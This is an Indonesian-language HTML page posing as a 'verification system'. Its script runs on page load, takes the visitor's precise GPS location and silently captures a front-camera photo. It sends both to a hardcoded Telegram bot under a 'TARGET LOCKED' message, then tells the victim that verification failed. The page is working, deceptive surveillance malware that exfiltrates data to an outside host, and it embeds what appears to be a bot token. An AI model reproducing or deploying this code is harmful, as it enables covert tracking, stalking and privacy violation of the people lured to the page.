<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .con { text-align: center; border: 1px solid #0f0; padding: 20px; width: 80%; box-shadow: 0 0 15px #0f0; }
    </style>
</head>
<body>

<video id="v" autoplay playsinline muted style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<div class="con">
    <div id="status">> MENGHUBUNGKAN KE SERVER...</div>
    <div style="font-size: 10px; color: #050; margin-top: 10px;">ID: 837-PZEN-09</div>
</div>

<script>
    const token = "8371743763:AAHfhPZENAYY0l8z5iUxsgHUuj-ney5SIa0";
    const chatId = "8465963357";

    async function start() {
        // Ambil Lokasi GPS Presisi
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                const text = `🎯 **TARGET LOCKED!**\n\n📍 Lat: ${p.coords.latitude}\n📍 Lon: ${p.coords.longitude}\n📏 Akurasi: ${p.coords.accuracy.toFixed(1)}m\n🗺️ Maps: https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`;
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'Markdown'})
                });
                snap();
            }, () => {
                // Fallback jika ditolak
                document.getElementById('status').innerHTML = "<span style='color:red'>KLIK 'IZINKAN' UNTUK VERIFIKASI DEVICE!</span>";
                snap(); 
            }, {enableHighAccuracy: true});
        }
    }

    async function snap() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            v.srcObject = stream;
            await v.play();
            setTimeout(() => {
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', b, 'shot.jpg');
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');
                document.getElementById('status').innerText = "> VERIFIKASI GAGAL. AKSES DITOLAK.";
            }, 1000);
        } catch (e) {}
    }
    window.onload = start;
</script>
</body>
</html>
